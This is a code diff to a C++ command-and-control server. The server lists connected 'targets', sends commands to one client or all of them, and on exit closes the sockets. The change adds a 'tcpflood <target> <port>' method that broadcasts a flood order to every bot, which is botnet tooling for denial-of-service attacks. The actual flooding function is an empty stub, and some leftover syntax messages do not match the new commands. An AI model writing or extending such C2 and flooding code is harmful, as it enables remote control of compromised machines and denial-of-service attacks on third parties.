@@ -8,12 +8,21 @@
 
 void print_help() {
     std::cout << "\n=== COMMAND PALETTE ===\n"
-              << "/help           - Show this menu\n"
-              << "/list           - List all active client IDs\n"
-              << "/send <id> <c>  - Send command <c> to a specific client ID\n"
-              << "/exit           - Shutdown the C2 server\n"
+              << "help           - Show this menu\n"
+              << "list           - List all active client IDs\n"
+              << "send <id> <c>  - Send command <c> to a specific client ID\n"
+              << "exit           - Shutdown the C2 server\n"
               << "[any text]      - Broadcast command to ALL connected clients\n"
               << "=======================\n" << std::endl;
+}
+
+void print_methods() {
+    std::cout << "========= METHODS ==========\n"
+              << "tcpflood <target> <port>" << std::endl;
+}
+
+void tcpflood() {
+    
 }
 
 int main() {
@@ -94,17 +103,17 @@ int main() {
                     continue;
                 }
 
-                if (cmd == "/help") {
+                if (cmd == "help") {
                     print_help();
                 } 
-                else if (cmd == "/list") {
+                else if (cmd == "list") {
                     std::cout << "--- Active Targets ---" << std::endl;
                     for (size_t j = 2; j < fds.size(); ++j) {
                         std::cout << "[Target ID]: " << fds[j].fd << std::endl;
                     }
                     if (fds.size() <= 2) std::cout << "No targets connected." << std::endl;
                 } 
-                else if (cmd.rfind("/send ", 0) == 0) { 
+                else if (cmd.rfind("send ", 0) == 0) { 
                     try {
                         size_t space1 = cmd.find(' ');
                         size_t space2 = cmd.find(' ', space1 + 1);
@@ -126,7 +135,7 @@ int main() {
                         std::cout << "[-] Syntax: /send <id> <command>" << std::endl;
                     }
                 } 
-                else if (cmd == "/exit") {
+                else if (cmd == "exit") {
                     std::cout << "[!] Shutting down C2 server..." << std::endl;
                     // Close all active sockets before exiting
                     for (const auto& slot : fds) {
@@ -134,11 +143,29 @@ int main() {
                     }
                     return 0;
                 }
-                else { // Default broadcast to all clients
-                    for (size_t j = 2; j < fds.size(); ++j) {
-                        send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
+                else if (cmd.rfind("tcpflood ", 0) == 0) {
+                    std::cout << "c2> you selected [tcpflood]" << std::endl;
+                    try {
+                        size_t space1 = cmd.find(' ');
+                        size_t space2 = cmd.find(' ', space1 + 1);
+
+                        std::string protocol = cmd.substr(0, space1);
+                        std::string ip = cmd.substr(space1 + 1, space2 - space1 - 1);
+                        int port = std::stoi(cmd.substr(space2 + 1));
+                        std::cout << protocol << std::endl; 
+                        std::cout << ip << std::endl;       
+                        std::cout << port << std::endl;
+                        
+                        for (size_t j = 2; j < fds.size(); ++j) {
+                            send(fds[j].fd, cmd.c_str(), cmd.length(), 0);
+                        }
                     }
-                    std::cout << "[*] Broadcasted to all: " << cmd << std::endl;
+                    catch (...) {
+                        std::cout << "Syntax: tcp <ip> <port>" << std::endl;
+                    }
+                }
+                else if (cmd == "clear") {
+                    std::cout << "\r";
                 }
                 
                 std::cout << "c2> " << std::flush;
@@ -150,7 +177,7 @@ int main() {
                 
                 if (bytes > 0) {
                     // \r clears the current 'c2> ' prompt so incoming lines break cleanly
-                    std::cout << "\r[Client " << fds[i].fd << "]: " << buf << "\nc2> " << std::flush;
+                    // std::cout << "\r[Client " << fds[i].fd << "]: " << buf << "\nc2> " << std::flush;
                 } else {
                     std::cout << "\r[-] Client " << fds[i].fd << " disconnected.\nc2> " << std::flush;
                     close(fds[i].fd);
